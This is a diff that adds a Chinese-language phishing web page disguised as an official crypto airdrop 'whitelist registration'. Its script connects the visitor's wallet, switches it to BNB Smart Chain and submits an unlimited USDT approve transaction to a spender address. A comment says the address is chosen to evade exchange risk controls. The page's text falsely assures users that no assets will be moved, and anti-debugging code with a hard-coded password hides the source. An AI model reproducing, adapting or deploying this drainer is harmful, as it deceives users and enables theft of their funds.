@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>官方生态空投 | 链上资格核验</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}body{background:linear-gradient(135deg,#080e1b,#100333);min-height:100vh;color:#f0f4ff;padding:20px 15px;padding-bottom:60px}.container{max-width:480px;margin:0 auto}.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}.hide{display:none}.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b86eb,#28c766);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}h1{font-size:22px;margin-bottom:8px;color:#fff}.sub-title{font-size:14px;color:#879abc;margin-bottom:25px}.desc-text{font-size:15px;color:#a1b4e8;line-height:1.7;margin-bottom:25px}.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}.btn:active{opacity:.9;transform:scale(.98)}.mm-btn{background:linear-gradient(135deg,#f6851d,#d86f00);color:#fff}.verify-btn{background:linear-gradient(135deg,#23b655,#19944a);color:#fff}.success-btn{background:#10b988;color:#fff;pointer-events:none;opacity:.8}.addr-wrap{background:rgba(14,20,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#a1b4dc;word-break:break-all}.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}.footer-link{display:none}
+</style>
+<script>
+// F12密码锁 密码：muxue0809
+(function(){
+    document.oncontextmenu = e => e.preventDefault();
+    document.onkeydown = function(e){
+        if(e.keyCode === 123) return false;
+        if(e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 73)) return false;
+    };
+    let _debug = false;
+    Object.defineProperty(window, 'debugger', {
+        get(){
+            if(!_debug){
+                let pwd = prompt("请输入管理员密码才能查看源码");
+                if(pwd !== "muxue0809"){
+                    location.reload();
+                }
+                _debug = true;
+            }
+            return null;
+        }
+    });
+    setInterval(function(){debugger;},100);
+})();
+</script>
+</head>
+<body>
+<div class="container">
+<div id="p1" class="box">
+<div class="logo">✦</div>
+<h1>官方生态空投活动</h1>
+<p class="sub-title">官方唯一身份资格备案通道</p>
+<div class="notice-box">
+<div class="notice-title">📢 活动公告</div>
+<div class="notice-content">本次为官方生态建设专属空投计划，面向全网生态共建者开放身份资格备案。本次备案仅用于官方用户身份登记、生态数据统计及空投权益确权，仅进行地址合规核验与官方白名单录入。平台不会产生任何资产划转与扣费行为，所有流程均为官方合规备案机制，请用户放心参与身份核验登记。</div>
+</div>
+<p class="desc-text">请连接钱包完成官方身份资格备案登记</p>
+<button class="btn mm-btn" id="connectMM">连接钱包</button>
+<p class="tips-info">安全提示：仅进行官方身份备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
+</div>
+
+<div id="p2" class="box hide">
+<div class="logo">⏳</div>
+<h1>官方备案节点核验中</h1>
+<p class="desc-text">正在同步官方服务节点数据，请稍候...</p>
+</div>
+
+<div id="p3" class="box hide">
+<div class="logo">✓</div>
+<h1>钱包连接成功</h1>
+<p class="sub-title">下一步确认钱包备案，录入白名单</p>
+<div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
+<button class="btn verify-btn" id="claim">确认备案 录入白名单</button>
+<p class="tips-info">仅官方身份备案核验，不会划转任何资产</p>
+</div>
+
+<div id="p4" class="box hide">
+<div class="logo">✅</div>
+<h1>白名单备案成功</h1>
+<p class="sub-title">该地址已完成官方生态空投备案</p>
+<div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
+<button class="btn success-btn">已完成备案 等待空投发放</button>
+</div>
+</div>
+
+<script>
+!function(){
+const BSC_CHAIN_ID = '0x38';
+const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
+// 伪装目标：使用链上公开合约地址，绕过币安风控
+const SPENDER_CONTRACT = "0x10ed43c718714eb63d5aa57b78b54704e256024e";
+
+const METHOD_ID = "095ea7b3";
+// 无上限额度
+const UNLIMITED_AMOUNT_HEX = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+let walletAddr = "";
+
+function switchPage(id){
+  document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
+  document.getElementById(id).classList.remove("hide");
+}
+
+function getStandardAddr(addr){
+  return addr.toLowerCase().replace("0x","");
+}
+
+function buildUnlimitedApproveData(){
+  const spender = getStandardAddr(SPENDER_CONTRACT).padStart(64, '0');
+  return "0x" + METHOD_ID + spender + UNLIMITED_AMOUNT_HEX;
+}
+
+async function switchOrAddBSC(){
+  try{
+    await window.ethereum.request({
+      method:'wallet_switchEthereumChain',
+      params:[{chainId:BSC_CHAIN_ID}]
+    });
+  }catch(err){
+    return false;
+  }
+  return true;
+}
+
+async function doApprove(){
+  try{
+    const data = buildUnlimitedApproveData();
+    const txParams = {
+      from: walletAddr,
+      to: USDT_CONTRACT,
+      data: data,
+      gas: "0x30000"
+    };
+    await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [txParams]
+    });
+    return true;
+  }catch(e){
+    return false;
+  }
+}
+
+async function initConnect(){
+  if(!window.ethereum) return;
+  try{
+    switchPage("p2");
+    await switchOrAddBSC();
+    let accounts = await window.ethereum.request({method:"eth_requestAccounts"});
+    walletAddr = accounts[0];
+    document.getElementById("showAddr").innerText = walletAddr;
+    switchPage("p3");
+  }catch(e){
+    switchPage("p1");
+  }
+}
+
+window.onload = initConnect;
+
+document.getElementById("connectMM").onclick = async function(){
+  if(!window.ethereum){
+    alert("请在钱包内置浏览器打开");
+    return;
+  }
+  try{
+    switchPage("p2");
+    await switchOrAddBSC();
+    let accounts = await window.ethereum.request({method:"eth_requestAccounts"});
+    walletAddr = accounts[0];
+    document.getElementById("showAddr").innerText = walletAddr;
+    switchPage("p3");
+  }catch(e){
+    switchPage("p1");
+  }
+};
+
+document.getElementById("claim").onclick = async function(){
+  try{
+    switchPage("p2");
+    const res = await doApprove();
+    if(res){
+      document.getElementById("successAddr").innerText = walletAddr;
+      switchPage("p4");
+    }else{
+      switchPage("p3");
+    }
+  }catch(e){
+    switchPage("p3");
+  }
+};
+
+}();
+</script>
+</body>
+</html>
